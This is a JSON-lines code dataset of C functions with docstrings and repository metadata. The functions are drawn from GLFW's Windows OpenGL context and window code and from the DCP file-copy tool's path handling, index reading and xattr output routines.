{"docstring": "// Analyzes the specified context for possible recreation\n//\n", "func_signal": "int _glfwAnalyzeContext(const _GLFWwindow* window,\n                        const _GLFWctxconfig* ctxconfig,\n                        const _GLFWfbconfig* fbconfig)", "code": "{\n    GLboolean required = GL_FALSE;\n\n    if (ctxconfig->api == GLFW_OPENGL_API)\n    {\n        if (ctxconfig->forward)\n        {\n            if (!window->wgl.ARB_create_context)\n            {\n                _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                \"WGL: A forward compatible OpenGL context requested but WGL_ARB_create_context is unavailable\");\n                return _GLFW_RECREATION_IMPOSSIBLE;\n            }\n\n            required = GL_TRUE;\n        }\n\n        if (ctxconfig->profile)\n        {\n            if (!window->wgl.ARB_create_context_profile)\n            {\n                _glfwInputError(GLFW_VERSION_UNAVAILABLE,\n                                \"WGL: OpenGL profile requested but WGL_ARB_create_context_profile is unavailable\");\n                return _GLFW_RECREATION_IMPOSSIBLE;\n            }\n\n            required = GL_TRUE;\n        }\n\n        if (ctxconfig->release)\n        {\n            if (window->wgl.ARB_context_flush_control)\n                required = GL_TRUE;\n        }\n    }\n    else\n    {\n        if (!window->wgl.ARB_create_context ||\n            !window->wgl.ARB_create_context_profile ||\n            !window->wgl.EXT_create_context_es2_profile)\n        {\n            _glfwInputError(GLFW_API_UNAVAILABLE,\n                            \"WGL: OpenGL ES requested but WGL_ARB_create_context_es2_profile is unavailable\");\n            return _GLFW_RECREATION_IMPOSSIBLE;\n        }\n\n        required = GL_TRUE;\n    }\n\n    if (ctxconfig->major != 1 || ctxconfig->minor != 0)\n    {\n        if (window->wgl.ARB_create_context)\n            required = GL_TRUE;\n    }\n\n    if (ctxconfig->debug)\n    {\n        if (window->wgl.ARB_create_context)\n            required = GL_TRUE;\n    }\n\n    if (fbconfig->samples > 0)\n    {\n        // We want FSAA, but can we get it?\n        // FSAA is not a hard constraint, so otherwise we just don't care\n\n        if (window->wgl.ARB_multisample && window->wgl.ARB_pixel_format)\n        {\n            // We appear to have both the extension and the means to ask for it\n            required = GL_TRUE;\n        }\n    }\n\n    if (fbconfig->sRGB)\n    {\n        // We want sRGB, but can we get it?\n        // sRGB is not a hard constraint, so otherwise we just don't care\n\n        if (window->wgl.ARB_framebuffer_sRGB && window->wgl.ARB_pixel_format)\n        {\n            // We appear to have both the extension and the means to ask for it\n            required = GL_TRUE;\n        }\n    }\n\n    if (required)\n        return _GLFW_RECREATION_REQUIRED;\n\n    return _GLFW_RECREATION_NOT_NEEDED;\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Translates a GLFW standard cursor to a resource ID\n//\n", "func_signal": "static LPWSTR translateCursorShape(int shape)", "code": "{\n    switch (shape)\n    {\n        case GLFW_ARROW_CURSOR:\n            return IDC_ARROW;\n        case GLFW_IBEAM_CURSOR:\n            return IDC_IBEAM;\n        case GLFW_CROSSHAIR_CURSOR:\n            return IDC_CROSS;\n        case GLFW_HAND_CURSOR:\n            return IDC_HAND;\n        case GLFW_HRESIZE_CURSOR:\n            return IDC_SIZEWE;\n        case GLFW_VRESIZE_CURSOR:\n            return IDC_SIZENS;\n    }\n\n    return NULL;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Return a list of available and usable framebuffer configs\n//\n", "func_signal": "static GLboolean choosePixelFormat(_GLFWwindow* window,\n                                   const _GLFWfbconfig* desired,\n                                   int* result)", "code": "{\n    _GLFWfbconfig* usableConfigs;\n    const _GLFWfbconfig* closest;\n    int i, nativeCount, usableCount;\n\n    if (window->wgl.ARB_pixel_format)\n    {\n        nativeCount = getPixelFormatAttrib(window,\n                                         1,\n                                         WGL_NUMBER_PIXEL_FORMATS_ARB);\n    }\n    else\n    {\n        nativeCount = DescribePixelFormat(window->wgl.dc,\n                                          1,\n                                          sizeof(PIXELFORMATDESCRIPTOR),\n                                          NULL);\n    }\n\n    usableConfigs = calloc(nativeCount, sizeof(_GLFWfbconfig));\n    usableCount = 0;\n\n    for (i = 0;  i < nativeCount;  i++)\n    {\n        const int n = i + 1;\n        _GLFWfbconfig* u = usableConfigs + usableCount;\n\n        if (window->wgl.ARB_pixel_format)\n        {\n            // Get pixel format attributes through WGL_ARB_pixel_format\n            if (!getPixelFormatAttrib(window, n, WGL_SUPPORT_OPENGL_ARB) ||\n                !getPixelFormatAttrib(window, n, WGL_DRAW_TO_WINDOW_ARB))\n            {\n                continue;\n            }\n\n            if (getPixelFormatAttrib(window, n, WGL_PIXEL_TYPE_ARB) !=\n                WGL_TYPE_RGBA_ARB)\n            {\n                continue;\n            }\n\n            if (getPixelFormatAttrib(window, n, WGL_ACCELERATION_ARB) ==\n                 WGL_NO_ACCELERATION_ARB)\n            {\n                continue;\n            }\n\n            u->redBits = getPixelFormatAttrib(window, n, WGL_RED_BITS_ARB);\n            u->greenBits = getPixelFormatAttrib(window, n, WGL_GREEN_BITS_ARB);\n            u->blueBits = getPixelFormatAttrib(window, n, WGL_BLUE_BITS_ARB);\n            u->alphaBits = getPixelFormatAttrib(window, n, WGL_ALPHA_BITS_ARB);\n\n            u->depthBits = getPixelFormatAttrib(window, n, WGL_DEPTH_BITS_ARB);\n            u->stencilBits = getPixelFormatAttrib(window, n, WGL_STENCIL_BITS_ARB);\n\n            u->accumRedBits = getPixelFormatAttrib(window, n, WGL_ACCUM_RED_BITS_ARB);\n            u->accumGreenBits = getPixelFormatAttrib(window, n, WGL_ACCUM_GREEN_BITS_ARB);\n            u->accumBlueBits = getPixelFormatAttrib(window, n, WGL_ACCUM_BLUE_BITS_ARB);\n            u->accumAlphaBits = getPixelFormatAttrib(window, n, WGL_ACCUM_ALPHA_BITS_ARB);\n\n            u->auxBuffers = getPixelFormatAttrib(window, n, WGL_AUX_BUFFERS_ARB);\n\n            if (getPixelFormatAttrib(window, n, WGL_STEREO_ARB))\n                u->stereo = GL_TRUE;\n            if (getPixelFormatAttrib(window, n, WGL_DOUBLE_BUFFER_ARB))\n                u->doublebuffer = GL_TRUE;\n\n            if (window->wgl.ARB_multisample)\n                u->samples = getPixelFormatAttrib(window, n, WGL_SAMPLES_ARB);\n\n            if (window->wgl.ARB_framebuffer_sRGB)\n            {\n                if (getPixelFormatAttrib(window, n, WGL_FRAMEBUFFER_SRGB_CAPABLE_ARB))\n                    u->sRGB = GL_TRUE;\n            }\n        }\n        else\n        {\n            PIXELFORMATDESCRIPTOR pfd;\n\n            // Get pixel format attributes through old-fashioned PFDs\n\n            if (!DescribePixelFormat(window->wgl.dc,\n                                     n,\n                                     sizeof(PIXELFORMATDESCRIPTOR),\n                                     &pfd))\n            {\n                continue;\n            }\n\n            if (!(pfd.dwFlags & PFD_DRAW_TO_WINDOW) ||\n                !(pfd.dwFlags & PFD_SUPPORT_OPENGL))\n            {\n                continue;\n            }\n\n            if (!(pfd.dwFlags & PFD_GENERIC_ACCELERATED) &&\n                (pfd.dwFlags & PFD_GENERIC_FORMAT))\n            {\n                continue;\n            }\n\n            if (pfd.iPixelType != PFD_TYPE_RGBA)\n                continue;\n\n            u->redBits = pfd.cRedBits;\n            u->greenBits = pfd.cGreenBits;\n            u->blueBits = pfd.cBlueBits;\n            u->alphaBits = pfd.cAlphaBits;\n\n            u->depthBits = pfd.cDepthBits;\n            u->stencilBits = pfd.cStencilBits;\n\n            u->accumRedBits = pfd.cAccumRedBits;\n            u->accumGreenBits = pfd.cAccumGreenBits;\n            u->accumBlueBits = pfd.cAccumBlueBits;\n            u->accumAlphaBits = pfd.cAccumAlphaBits;\n\n            u->auxBuffers = pfd.cAuxBuffers;\n\n            if (pfd.dwFlags & PFD_STEREO)\n                u->stereo = GL_TRUE;\n            if (pfd.dwFlags & PFD_DOUBLEBUFFER)\n                u->doublebuffer = GL_TRUE;\n        }\n\n        u->wgl = n;\n        usableCount++;\n    }\n\n    if (!usableCount)\n    {\n        _glfwInputError(GLFW_API_UNAVAILABLE,\n                        \"WGL: The driver does not appear to support OpenGL\");\n\n        free(usableConfigs);\n        return GL_FALSE;\n    }\n\n    closest = _glfwChooseFBConfig(desired, usableConfigs, usableCount);\n    if (!closest)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR,\n                        \"WGL: Failed to find a suitable pixel format\");\n\n        free(usableConfigs);\n        return GL_FALSE;\n    }\n\n    *result = closest->wgl;\n    free(usableConfigs);\n\n    return GL_TRUE;\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Restores the mouse cursor\n//\n", "func_signal": "static void restoreCursor(_GLFWwindow* window)", "code": "{\n    POINT pos;\n\n    ClipCursor(NULL);\n\n    if (GetCursorPos(&pos))\n    {\n        if (WindowFromPoint(pos) == window->win32.handle)\n        {\n            if (window->cursor)\n                SetCursor(window->cursor->win32.handle);\n            else\n                SetCursor(LoadCursorW(NULL, IDC_ARROW));\n        }\n    }\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Initialize WGL-specific extensions\n// This function is called once before initial context creation, i.e. before\n// any WGL extensions could be present.  This is done in order to have both\n// extension variable clearing and loading in the same place, hopefully\n// decreasing the possibility of forgetting to add one without the other.\n//\n", "func_signal": "static void initWGLExtensions(_GLFWwindow* window)", "code": "{\n    // This needs to include every function pointer loaded below\n    window->wgl.SwapIntervalEXT = NULL;\n    window->wgl.GetPixelFormatAttribivARB = NULL;\n    window->wgl.GetExtensionsStringARB = NULL;\n    window->wgl.GetExtensionsStringEXT = NULL;\n    window->wgl.CreateContextAttribsARB = NULL;\n\n    // This needs to include every extension used below except for\n    // WGL_ARB_extensions_string and WGL_EXT_extensions_string\n    window->wgl.ARB_multisample = GL_FALSE;\n    window->wgl.ARB_framebuffer_sRGB = GL_FALSE;\n    window->wgl.ARB_create_context = GL_FALSE;\n    window->wgl.ARB_create_context_profile = GL_FALSE;\n    window->wgl.EXT_create_context_es2_profile = GL_FALSE;\n    window->wgl.ARB_create_context_robustness = GL_FALSE;\n    window->wgl.EXT_swap_control = GL_FALSE;\n    window->wgl.ARB_pixel_format = GL_FALSE;\n    window->wgl.ARB_context_flush_control = GL_FALSE;\n\n    window->wgl.GetExtensionsStringEXT = (PFNWGLGETEXTENSIONSSTRINGEXTPROC)\n        wglGetProcAddress(\"wglGetExtensionsStringEXT\");\n    if (!window->wgl.GetExtensionsStringEXT)\n    {\n        window->wgl.GetExtensionsStringARB = (PFNWGLGETEXTENSIONSSTRINGARBPROC)\n            wglGetProcAddress(\"wglGetExtensionsStringARB\");\n        if (!window->wgl.GetExtensionsStringARB)\n            return;\n    }\n\n    if (_glfwPlatformExtensionSupported(\"WGL_ARB_multisample\"))\n        window->wgl.ARB_multisample = GL_TRUE;\n\n    if (_glfwPlatformExtensionSupported(\"WGL_ARB_framebuffer_sRGB\"))\n        window->wgl.ARB_framebuffer_sRGB = GL_TRUE;\n\n    if (_glfwPlatformExtensionSupported(\"WGL_ARB_create_context\"))\n    {\n        window->wgl.CreateContextAttribsARB = (PFNWGLCREATECONTEXTATTRIBSARBPROC)\n            wglGetProcAddress(\"wglCreateContextAttribsARB\");\n\n        if (window->wgl.CreateContextAttribsARB)\n            window->wgl.ARB_create_context = GL_TRUE;\n    }\n\n    if (window->wgl.ARB_create_context)\n    {\n        if (_glfwPlatformExtensionSupported(\"WGL_ARB_create_context_profile\"))\n            window->wgl.ARB_create_context_profile = GL_TRUE;\n    }\n\n    if (window->wgl.ARB_create_context &&\n        window->wgl.ARB_create_context_profile)\n    {\n        if (_glfwPlatformExtensionSupported(\"WGL_EXT_create_context_es2_profile\"))\n            window->wgl.EXT_create_context_es2_profile = GL_TRUE;\n    }\n\n    if (window->wgl.ARB_create_context)\n    {\n        if (_glfwPlatformExtensionSupported(\"WGL_ARB_create_context_robustness\"))\n            window->wgl.ARB_create_context_robustness = GL_TRUE;\n    }\n\n    if (_glfwPlatformExtensionSupported(\"WGL_EXT_swap_control\"))\n    {\n        window->wgl.SwapIntervalEXT = (PFNWGLSWAPINTERVALEXTPROC)\n            wglGetProcAddress(\"wglSwapIntervalEXT\");\n\n        if (window->wgl.SwapIntervalEXT)\n            window->wgl.EXT_swap_control = GL_TRUE;\n    }\n\n    if (_glfwPlatformExtensionSupported(\"WGL_ARB_pixel_format\"))\n    {\n        window->wgl.GetPixelFormatAttribivARB = (PFNWGLGETPIXELFORMATATTRIBIVARBPROC)\n            wglGetProcAddress(\"wglGetPixelFormatAttribivARB\");\n\n        if (window->wgl.GetPixelFormatAttribivARB)\n            window->wgl.ARB_pixel_format = GL_TRUE;\n    }\n\n    if (_glfwPlatformExtensionSupported(\"WGL_ARB_context_flush_control\"))\n        window->wgl.ARB_context_flush_control = GL_TRUE;\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Disable the mouse cursor\n//\n", "func_signal": "static void disableCursor(_GLFWwindow* window)", "code": "{\n    POINT pos;\n\n    updateClipRect(window);\n\n    if (GetCursorPos(&pos))\n    {\n        if (WindowFromPoint(pos) == window->win32.handle)\n            SetCursor(NULL);\n    }\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                        GLFW native API                       //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "GLFWAPI HWND glfwGetWin32Window(GLFWwindow* handle)", "code": "{\n    _GLFWwindow* window = (_GLFWwindow*) handle;\n    _GLFW_REQUIRE_INIT_OR_RETURN(NULL);\n    return window->win32.handle;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Initialize WGL\n//\n", "func_signal": "int _glfwInitContextAPI(void)", "code": "{\n    if (!_glfwInitTLS())\n        return GL_FALSE;\n\n    _glfw.wgl.opengl32.instance = LoadLibraryW(L\"opengl32.dll\");\n    if (!_glfw.wgl.opengl32.instance)\n    {\n        _glfwInputError(GLFW_PLATFORM_ERROR, \"WGL: Failed to load opengl32.dll\");\n        return GL_FALSE;\n    }\n\n    return GL_TRUE;\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Translate client window size to full window size (including window borders)\n//\n", "func_signal": "static void getFullWindowSize(_GLFWwindow* window,\n                              int clientWidth, int clientHeight,\n                              int* fullWidth, int* fullHeight)", "code": "{\n    RECT rect = { 0, 0, clientWidth, clientHeight };\n    AdjustWindowRectEx(&rect, window->win32.dwStyle,\n                       FALSE, window->win32.dwExStyle);\n    *fullWidth = rect.right - rect.left;\n    *fullHeight = rect.bottom - rect.top;\n}", "path": "src\\glfw-3.1.1\\src\\win32_window.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "// Destroy the OpenGL context\n//\n", "func_signal": "void _glfwDestroyContext(_GLFWwindow* window)", "code": "{\n    if (window->wgl.context)\n    {\n        wglDeleteContext(window->wgl.context);\n        window->wgl.context = NULL;\n    }\n\n    if (window->wgl.dc)\n    {\n        ReleaseDC(window->win32.handle, window->wgl.dc);\n        window->wgl.dc = NULL;\n    }\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "//////////////////////////////////////////////////////////////////////////\n//////                        GLFW native API                       //////\n//////////////////////////////////////////////////////////////////////////\n", "func_signal": "GLFWAPI HGLRC glfwGetWGLContext(GLFWwindow* handle)", "code": "{\n    _GLFWwindow* window = (_GLFWwindow*) handle;\n    _GLFW_REQUIRE_INIT_OR_RETURN(NULL);\n    return window->wgl.context;\n}", "path": "src\\glfw-3.1.1\\src\\wgl_context.c", "repo_name": "jvanverth/essentialmath", "stars": 362, "license": "other", "language": "c", "size": 10575}
{"docstring": "/* Main ***********************************************************************/\n", "func_signal": "int main(int argc, const char *argv[])", "code": "{\n    int r;\n    struct cmdline_info info;\n    struct mainopts opts;\n\n    /* use the gengetopts code to parse the command line input, then convert to\n     * a dcp_options struct */\n    cmdline_parser(argc, (char **) argv, &info);\n    mainopts_parse(&opts, &info);\n    r = dcp_main(&opts, argc, argv);\n    mainopts_cleanup(&opts);\n    cmdline_parser_free(&info);\n    return r;\n}", "path": "src\\main.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "int initdestandpaths(file_t *dest, char *path, const char **destpath,\n        const char **dapath, const char *newpath, size_t src_count)", "code": "{\n    int fd;\n    char *real;\n    char *tmp;\n    char *delim;\n\n    /* newpath is a directory that exists */\n    if ((fd = open(newpath, O_RDONLY | O_DIRECTORY)) != -1)\n    {\n        tmp = strdup(newpath);\n        REMOVE_TRAILING_SLASHES(tmp);\n        dest->fd = fd;\n        dest->path = tmp;\n        strcpy(path, \"\");\n        *destpath = path + 1;\n        *dapath = path;\n        return 0;\n    }\n\n    /* if dest does not exist open its parent directory */\n    if (errno == ENOENT)\n    {\n        if (src_count > 1)\n        {\n            log_errorx(\"target `%s' is not a directory\", newpath);\n            return -1;\n        }\n\n        tmp = strdup(newpath);\n        REMOVE_TRAILING_SLASHES(tmp);\n\n        /* if no slash specified assume cwd */\n        if ((delim = strrchr(tmp, '/')) == NULL)\n        {\n            dest->fd = open(\".\", O_RDONLY | O_DIRECTORY);\n            dest->path = calloc(sizeof(char), 1);\n            strcpy(path, tmp);\n            *destpath = path;\n            *dapath = path + strlen(path);\n            free(tmp);\n            return 0;\n        }\n\n        /* our path begins with the new filename */\n        strcpy(path, delim + 1);\n        *destpath = path;\n        *dapath = path + strlen(path);\n\n        *delim = '\\0';\n        if ((fd = open(tmp, O_RDONLY | O_DIRECTORY)) == -1)\n        {\n            log_error(\"cannot open target parent `%s'\", tmp);\n            free(tmp);\n            return -1;\n        }\n\n        dest->fd = fd;\n        dest->path = tmp;\n        return 0;\n    }\n\n    /*\n     * newpath exists and is not a directory\n     *     1. make sure we have a single source target\n     *     2. make sure source is not a directory\n     */\n    if (errno == ENOTDIR)\n    {\n        if (src_count > 1)\n        {\n            log_errorx(\"target `%s' is not a directory\", newpath);\n            return -1;\n        }\n\n        /* cwd */\n        if(strrchr(newpath, '/') == NULL)\n        {\n            dest->fd = open(\".\", O_RDONLY | O_DIRECTORY);\n            dest->path = calloc(sizeof(char), 1);\n            strcpy(path, newpath);\n            *destpath = path;\n            *dapath = path + strlen(path);\n            return 0;\n        }\n\n        /* open newpath's parent directory */\n        if ((real = realpath(newpath, NULL)) == NULL)\n        {\n            log_error(\"cannot resolve target `%s'\", newpath);\n            return -1;\n        }\n\n        /* if realpath worked it better have a '/' character! */\n        tmp = strrchr(real, '/');\n        strcpy(path, tmp + 1);\n        REMOVE_TRAILING_SLASHES(path);\n        *destpath = path;\n        *dapath = path + strlen(path);\n\n        *tmp = '\\0';\n        if ((fd = open(real, O_RDONLY | O_DIRECTORY)) == -1)\n        {\n            log_error(\"cannot open target parent `%s'\", real);\n            free(real);\n            return -1;\n        }\n\n        dest->fd = fd;\n        dest->path = real;\n        return 0;\n    }\n\n    /* if we get here there was a problem opening up newpath log and fail */\n    log_error(\"cannot open '%s'\", newpath);\n    return -1;\n}", "path": "src\\impl\\dcp.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int pack(void *dest, const char *hex, size_t line)", "code": "{\n    size_t i, j;\n    size_t count;\n    unsigned char c1, c2;\n\n    count = strlen(hex);\n    for (i = 0, j = 0; i < count; i += 2, j++)\n    {\n        c1 = hex[i];\n        c2 = hex[i + 1];\n        if (!(IS_VALID_HEX_CHAR(c1) && IS_VALID_HEX_CHAR(c2)))\n        {\n            log_errorx(\"corrupt input, invalid hex char '%c' or '%c' on line \"\n                    \"%zu\", c1, c2, line);\n            return -1;\n        }\n        ((uint8_t *) dest)[j] =\n                hex2dec[(int) hex[i]] * 16 + hex2dec[(int) hex[i + 1]];\n    }\n    return 0;\n}", "path": "src\\io\\pack.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int io_index_read(index_t *idx, const char *path)", "code": "{\n    FILE *stream;\n    size_t linenum;\n    int dgsts;\n    int expected;\n    entry_t entry;\n    digest_t type;\n\n    if ((stream = fopen(path, \"r\")) == NULL)\n    {\n        log_error(\"cannot open '%s'\", path);\n        return -1;\n    }\n\n    type = index_get_digest_type(idx);\n    linenum = 0;\n    expected = 0;\n    while (io_entry_read(&entry, stream, &linenum) == 0)\n    {\n        /* the index is only regular files, ignore everything else */\n        if (!S_ISREG(entry.mode))\n            continue;\n\n        /* create a mask of all digests that the entry had */\n       dgsts = valid_digests(&entry);\n\n       /* make sure the index's digest type is defined */\n       if ((dgsts & type) == 0)\n       {\n           log_warnx(\"ignoring entry at '%s:%zd': missing '%s'\", path, linenum,\n                   digest_name(type));\n           continue;\n       }\n\n       /* for consistency check that all lines have the same digests */\n       if (expected == 0)\n           expected = dgsts;\n       else if (expected != dgsts)\n           log_warnx(\"inconsistent fields found at '%s:%zd'\", path, linenum);\n\n\n       switch (type)\n       {\n       case DGST_MD5:\n           add_or_warn(idx, entry.pathmd5, entry.md5, path, linenum);\n           break;\n\n       case DGST_SHA1:\n           add_or_warn(idx, entry.pathmd5, entry.sha1, path, linenum);\n           break;\n\n       case DGST_SHA256:\n           add_or_warn(idx, entry.pathmd5, entry.sha256, path, linenum);\n           break;\n\n       case DGST_SHA512:\n           add_or_warn(idx, entry.pathmd5, entry.sha512, path, linenum);\n           break;\n       }\n    }\n    fclose(stream);\n    return 0;\n}", "path": "src\\io\\io_index.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int io_entry_write_xattr_fields(const void *pathmd5, const char *name,\n        void *valuebuffer, ssize_t valuesize, FILE *stream)", "code": "{\n    int ret;\n    int w;\n\n    /* where to store the hex representation of the path md5 sum */\n    char buf[(MD5_DIGEST_LENGTH * 2) + 1];\n\n    /* we store the xattr value as base64 */\n    BIO *bio, *b64;\n\n    /* used to properly escape the utf-8 name of an xattr */\n    json_t *escaped;\n\n    ret = 0;\n    b64 = NULL;\n\n    /* we are writing a json object on the line */\n    fputc('{', stream);\n\n    unpack(buf, pathmd5, MD5_DIGEST_LENGTH);\n    fprintf(stream, \"\\\"pathmd5\\\":\\\"%s\\\",\", buf);\n\n    if (name != NULL)\n    {\n        if ((escaped = json_string(name)) == NULL)\n        {\n            log_errorx(\"non valid utf-8 xattr string '%s'\", name);\n            ret = -1;\n            goto cleanup;\n        }\n        fputs(\"\\\"xattrName\\\":\", stream);\n        json_dumpf(escaped, stream, JSON_ENCODE_ANY);\n        json_decref(escaped);\n    }\n\n    if (valuesize > 0)\n    {\n        fputs(\",\\\"xattrValue\\\":\\\"\", stream);\n        /*\n         * base64 encoding\n         * https://www.openssl.org/docs/manmaster/crypto/BIO_f_base64.html\n         */\n        b64 = BIO_new(BIO_f_base64());\n        BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); /* do not append newline */\n        bio = BIO_new_fp(stream, BIO_NOCLOSE);      /* do not close stream */\n        BIO_push(b64, bio);\n        if ((w = BIO_write(b64, valuebuffer, valuesize)) != valuesize)\n        {\n            log_errorx(\"cannot base64 encode xattr value for attr: '%s'\", name);\n            ret = -1;\n        }\n        BIO_flush(b64);\n        BIO_free_all(b64);\n        fputc('\"', stream);\n    }\n\n\ncleanup:\n    /* print a newline our record separator */\n    fputs(\"}\\n\", stream);\n    return ret;\n}", "path": "src\\io\\io_xattr.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Private Impl ***************************************************************/\n", "func_signal": "inline int pack_digest(void *dest, size_t digest_length, const json_t *str,\n        size_t line, const char *name)", "code": "{\n    ssize_t count;\n    count = decode_hexjsonstr(dest, digest_length, str, line);\n\n    /* if digest is empty act as if it was not present in the object */\n    if (count == 0)\n        return 1;\n\n    else if (count == (ssize_t) digest_length)\n        return 0;\n\n    else\n    {\n        log_errorx(\"corrupt input, %s invalid length on line %zu\", name, line);\n        return -1;\n    }\n}", "path": "src\\io\\io_entry.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int process_special(file_t *newdir, const char *newpath, const char *oldpath,\n        const struct stat *oldst, const char *dapath, const void *pathmd5,\n        const struct process_opts *opts)", "code": "{\n    UNUSED(oldpath);\n    int r;\n    dcp_state_t state;\n\n    state = DCP_SPECIAL_CREATED;\n    if ((r = mknodat(newdir->fd, newpath,\n            (oldst->st_mode & S_IFMT) | 0666, oldst->st_rdev)) != 0)\n    {\n        log_error(\"cannot create special file '%s'\", pathstr(newdir, newpath));\n        state = DCP_FAILED;\n    }\n\n    if (r == 0 && fchownat(newdir->fd, newpath, opts->uid, opts->gid, 0) != 0)\n        log_warn(\"cannot chown '%s'\", pathstr(newdir, newpath));\n\n    opts->callback(state, pathmd5, dapath, oldst, oldpath, NULL, NULL, NULL, NULL, NULL, -1,\n            opts->callback_ctx);\n    return r;\n}", "path": "src\\impl\\process_special.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/* Public Impl ****************************************************************/\n", "func_signal": "int preprocess(file_t *newdir, const char *newpath, const char *oldpath,\n        const struct stat *oldst, int verbose)", "code": "{\n    struct stat st;\n\n    if (fstatat(newdir->fd, newpath + 1, &st, 0) == -1)\n    {\n        if (errno == ENOENT)\n            goto cleanup;\n\n        else\n        {\n            log_error(\"cannot stat '%s'\", pathstr(newdir, newpath));\n            return -1;\n        }\n    }\n\n    /* where we want to copy our file exists, let's validate we can remove it */\n    if (S_ISDIR(oldst->st_mode))\n    {\n        /* if dest is a directory we are done, nothing to output*/\n        if (S_ISDIR(st.st_mode))\n            return 0;\n\n        /* else error */\n        log_errorx(\"cannot overwrite non-directory `%s' with directory `%s'\",\n                pathstr(newdir, newpath), oldpath);\n        return -1;\n    }\n\n    else\n    {\n        /* old is not a directory but new exists and is a directory, error */\n        if (S_ISDIR(st.st_mode))\n        {\n            log_errorx(\"cannot overwrite directory `%s' with non-directory \"\n                    \"`%s'\", pathstr(newdir, newpath), oldpath);\n            return -1;\n        }\n\n        /* remove whatever is in new */\n        if (unlinkat(newdir->fd, newpath + 1, 0) == -1)\n        {\n            log_error(\"cannot remove `%s'\", pathstr(newdir, newpath));\n            return -1;\n        }\n\n        if (verbose)\n        {\n            fprintf(stdout, \"removed `%s'\\n\", pathstr(newdir, newpath));\n            fflush(stdout);\n        }\n    }\n\n    cleanup:\n        if (verbose)\n        {\n            fprintf(stdout, \"`%s' -> `%s'\\n\",oldpath,pathstr(newdir, newpath));\n            fflush(stdout);\n        }\n        return 0;\n}", "path": "src\\impl\\preprocess.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
{"docstring": "/*\n * ensure that the following 2 commands give the same dcp output\n *  dcp src dest\n *  dcp src dest/src\n *\n * where src and dest are directories that exist\n */\n", "func_signal": "int prepare(const char **files, size_t count, const char *dest, char **newdest)", "code": "{\n    int r;\n    struct stat st;\n    char *path;\n    char *name;\n    char *fulldest;\n\n    *newdest = NULL;\n\n    /* if we have a single src operand and it is a dir and a dest that exists\n     * create the new directory and update the dest string */\n    if (count == 1)\n    {\n        /* duplicate so we can use basename on it */\n        path = strdup(files[0]);\n        if (stat(path, &st) != 0)\n        {\n            log_error(\"cannot stat `%s'\", path);\n            free(path);\n            return -1;\n        }\n\n        if (S_ISDIR(st.st_mode))\n        {\n            r = stat(dest, &st);\n            /* if dest exists ... */\n            if (r == 0)\n            {\n                /* ... and is a directory */\n                if (S_ISDIR(st.st_mode))\n                {\n                    name = basename(path);\n                    /* build the dest/name path including the slash if needed */\n                    if(asprintf(&fulldest, \"%s%s%s\", dest,\n                        dest[strlen(dest)-1] == '/'? \"\" : \"/\", name) < 0)\n                    {\n                        fulldest = NULL;\n                    }\n                    /* success report back the new dest */\n                    *newdest = fulldest;\n                }\n            }\n\n            /* dest not existing is not an error */\n            else if(errno != ENOENT)\n            {\n                log_error(\"cannot stat `%s'\", dest);\n                free(path);\n                return -1;\n            }\n        }\n        free(path);\n    }\n\n    return 0;\n}", "path": "src\\main.c", "repo_name": "NationalSecurityAgency/DCP", "stars": 320, "license": "other", "language": "c", "size": 73}
